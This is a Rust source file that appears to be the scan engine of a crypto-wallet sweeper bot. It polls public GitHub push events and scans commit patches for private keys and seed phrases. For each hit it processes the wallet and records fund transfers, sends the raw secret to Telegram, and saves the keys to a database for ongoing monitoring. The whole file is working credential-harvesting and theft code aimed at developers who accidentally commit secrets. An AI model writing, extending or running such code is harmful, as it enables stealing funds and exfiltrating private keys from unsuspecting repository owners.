use crate::config::Config;
use crate::core::cache::CacheManager;
use crate::core::queue::EventQueue;
use crate::database::models::{MonitoredWalletDoc, ScanLogDoc};
use crate::database::ops::DatabaseOps;
use crate::models::github::{CommitDetail, GitHubEvent};
use crate::models::scan::{CryptoSecret, FilePriority, SecretType};
use crate::patterns::matcher::PatternMatcher;
use crate::scanner::commits::{CommitFetcher, CommitWithRepo};
use crate::scanner::events::GitHubEventsPoller;
use crate::scanner::files::{should_scan_file, get_file_priority};
use crate::telegram::alerts::TelegramAlerts;
use crate::wallet::manager::WalletManager;
use std::sync::Arc;
use tracing::{info, warn};

pub struct ScanEngine {
    config: Arc<Config>,
    cache: Arc<CacheManager>,
    matcher: Arc<PatternMatcher>,
    wallet_manager: Arc<WalletManager>,
    telegram: Arc<TelegramAlerts>,
    db_ops: Arc<DatabaseOps>,
    event_queue: Arc<EventQueue<GitHubEvent>>,
    commit_queue: Arc<EventQueue<CommitWithRepo>>,
}

impl ScanEngine {
    pub fn new(
        config: Arc<Config>,
        cache: Arc<CacheManager>,
        wallet_manager: Arc<WalletManager>,
        telegram: Arc<TelegramAlerts>,
        db_ops: Arc<DatabaseOps>,
    ) -> Arc<Self> {
        Arc::new(Self {
            config: config.clone(),
            cache,
            matcher: Arc::new(PatternMatcher::new()),
            wallet_manager,
            telegram,
            db_ops,
            event_queue: EventQueue::new(50_000),
            commit_queue: EventQueue::new(50_000),
        })
    }
    
    // Main engine run
    pub async fn run(self: Arc<Self>) {
        info!("🚀 Scan engine started");
        
        // Clone for producer
        let engine = self.clone();
        
        // Producer: Poll GitHub events
        let producer = tokio::spawn(async move {
            let poller = GitHubEventsPoller::new(engine.config.clone());
            
            poller.poll(move |event| {
                let engine = engine.clone();
                tokio::spawn(async move {
                    engine.process_push_event(event).await;
                });
            }).await;
        });
        
        // Consumer 1: Fetch commits
        let engine = self.clone();
        let consumer1 = tokio::spawn(async move {
            let fetcher = CommitFetcher::new(engine.config.clone());
            
            while let Ok(event) = engine.event_queue.receiver().recv_async().await {
                let commits = fetcher.fetch_commits(&event).await;
                
                for commit in commits {
                    let _ = engine.commit_queue.sender().send_async(commit).await;
                }
            }
        });
        
        // Consumer 2: Scan commits (parallel)
        let engine = self.clone();
        let consumer2 = tokio::spawn(async move {
            while let Ok(commit_with_repo) = engine.commit_queue.receiver().recv_async().await {
                let engine = engine.clone();
                tokio::spawn(async move {
                    engine.scan_commit(commit_with_repo).await;
                });
            }
        });
        
        // Wait for all tasks
        let _ = tokio::join!(producer, consumer1, consumer2);
    }
    
    // Process push event
    async fn process_push_event(&self, event: GitHubEvent) {
        // Check cache for duplicate
        if let Some(commits) = &event.payload.commits {
            for commit in commits {
                if self.cache.should_scan_commit(&commit.sha) {
                    let _ = self.event_queue.sender().send_async(event.clone()).await;
                    break; // One event per commit batch
                }
            }
        }
    }
    
    // Scan commit for secrets
    async fn scan_commit(&self, commit_with_repo: CommitWithRepo) {
        let repo_name = commit_with_repo.repo_name;
        let commit = commit_with_repo.commit;
        let commit_sha = commit.sha.clone();
        
        let files = match &commit.files {
            Some(files) => files,
            None => return,
        };
        
        for file in files {
            // Check if file should be scanned
            if !should_scan_file(&file.filename) {
                continue;
            }
            
            // Get file priority
            let priority = get_file_priority(&file.filename);
            
            // Skip low priority files
            if priority == FilePriority::Skip {
                continue;
            }
            
            // Scan patch if available
            if let Some(patch) = &file.patch {
                let secrets = self.matcher.scan_content(patch);
                
                if !secrets.is_empty() {
                    for secret in secrets {
                        info!(
                            "🔑 Secret found: {:?} in {} ({})",
                            secret.secret_type, file.filename, repo_name
                        );
                        
                        // Process secret immediately
                        self.process_secret(
                            repo_name.clone(),
                            commit_sha.clone(),
                            file.filename.clone(),
                            secret,
                        ).await;
                    }
                }
            }
        }
    }
    
    // Process found secret
    async fn process_secret(
        &self,
        repo_name: String,
        commit_sha: String,
        file_path: String,
        secret: CryptoSecret,
    ) {
        info!("🔐 Processing {} from {}", secret.secret_type, file_path);
        
        match secret.secret_type {
            SecretType::PrivateKey => {
                // Process private key
                match self.wallet_manager.process_private_key(&secret.value).await {
                    Ok((wallet_info, transfer_result)) => {
                        // Send secret found alert
                        self.telegram.send_secret_found(
                            &repo_name,
                            &commit_sha,
                            &file_path,
                            "PrivateKey",
                            &secret.value,
                        ).await;
                        
                        // Send balance detected alert
                        self.telegram.send_balance_detected(&wallet_info).await;
                        
                        // If transfer happened
                        if let Some(transfer) = transfer_result {
                            if transfer.success {
                                self.telegram.send_transfer_success(&wallet_info, &transfer).await;
                            } else {
                                if let Some(error) = &transfer.error {
                                    self.telegram.send_transfer_failed(&wallet_info, error).await;
                                }
                            }
                        }
                        
                        // Save to database for monitoring
                        let monitored = MonitoredWalletDoc::new(
                            wallet_info.address.clone(),
                            wallet_info.private_key.clone(),
                            None,
                            repo_name.clone(),
                            commit_sha.clone(),
                            file_path.clone(),
                        );
                        
                        let _ = self.db_ops.save_monitored_wallet(monitored).await;
                        
                        // Save scan log
                        let scan_log = ScanLogDoc::new(
                            repo_name.clone(),
                            commit_sha.clone(),
                            file_path.clone(),
                            "PrivateKey".to_string(),
                            secret.value.clone(),
                        );
                        
                        let _ = self.db_ops.save_scan_log(scan_log).await;
                    }
                    Err(e) => {
                        warn!("Failed to process private key: {}", e);
                    }
                }
            }
            SecretType::SeedPhrase => {
                // Process seed phrase
                match self.wallet_manager.process_seed_phrase(&secret.value).await {
                    Ok(results) => {
                        // Send secret found alert
                        self.telegram.send_secret_found(
                            &repo_name,
                            &commit_sha,
                            &file_path,
                            "SeedPhrase",
                            &secret.value,
                        ).await;
                        
                        // Process each derived wallet
                        for (wallet_info, transfer_result) in results {
                            // Send balance detected alert
                            self.telegram.send_balance_detected(&wallet_info).await;
                            
                            // If transfer happened
                            if let Some(transfer) = transfer_result {
                                if transfer.success {
                                    self.telegram.send_transfer_success(&wallet_info, &transfer).await;
                                } else {
                                    if let Some(error) = &transfer.error {
                                        self.telegram.send_transfer_failed(&wallet_info, error).await;
                                    }
                                }
                            }
                            
                            // Save to database
                            let monitored = MonitoredWalletDoc::new(
                                wallet_info.address.clone(),
                                wallet_info.private_key.clone(),
                                Some(secret.value.clone()),
                                repo_name.clone(),
                                commit_sha.clone(),
                                file_path.clone(),
                            );
                            
                            let _ = self.db_ops.save_monitored_wallet(monitored).await;
                        }
                        
                        // Save scan log
                        let scan_log = ScanLogDoc::new(
                            repo_name.clone(),
                            commit_sha.clone(),
                            file_path.clone(),
                            "SeedPhrase".to_string(),
                            secret.value.clone(),
                        );
                        
                        let _ = self.db_ops.save_scan_log(scan_log).await;
                    }
                    Err(e) => {
                        warn!("Failed to process seed phrase: {}", e);
                    }
                }
            }
        }
    }
}